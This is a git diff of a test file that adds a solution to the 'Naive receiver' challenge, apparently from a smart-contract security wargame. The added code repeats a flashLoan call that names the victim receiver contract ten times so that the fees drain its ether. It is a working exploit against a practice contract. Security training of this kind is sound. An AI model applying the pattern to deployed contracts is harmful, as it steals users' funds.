@@ -1,4 +1,4 @@
-const { ethers } = require('hardhat');
+const { ethers,abi } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Naive receiver', function () {
@@ -10,6 +10,8 @@ describe('[Challenge] Naive receiver', function () {
 
     // Receiver has 10 ETH in balance
     const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
+
+    const ETHER_DEMAND=( 20n * 10n ** 18n)
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -28,6 +30,7 @@ describe('[Challenge] Naive receiver', function () {
 
         receiver = await FlashLoanReceiverFactory.deploy(pool.address);
         await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
+        //why it needs to be reverted ?
         await expect(
             receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
         ).to.be.reverted;
@@ -37,7 +40,72 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+     // Function name and parameters
+     const ETH = await pool.ETH();
+    const functionName = "flashLoan";
+    const functionParams = [
+    receiver.address,
+    ETH,
+    ETHER_IN_RECEIVER,
+    "0x"
+    ];
+
+    const encodedFunctionData= await pool.interface.encodeFunctionData(
+        functionName,
+        functionParams
+    )
+        const batch = [
+            {
+              to: pool.address,
+              data:encodedFunctionData
+            },
+            {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+              {
+                to: pool.address,
+                data:encodedFunctionData
+              },
+        
+          ];
+        
+          const transactionPromises = batch.map((tx) =>
+          player.sendTransaction(tx)
+        );
+          // Wait for all the transactions to be mined
+  const transactionReceipts = await Promise.all(transactionPromises);
+
+  console.log("Multiple transactions sent successfully.");
+  console.log("Transaction receipts:", transactionReceipts);
     });
 
     after(async function () {
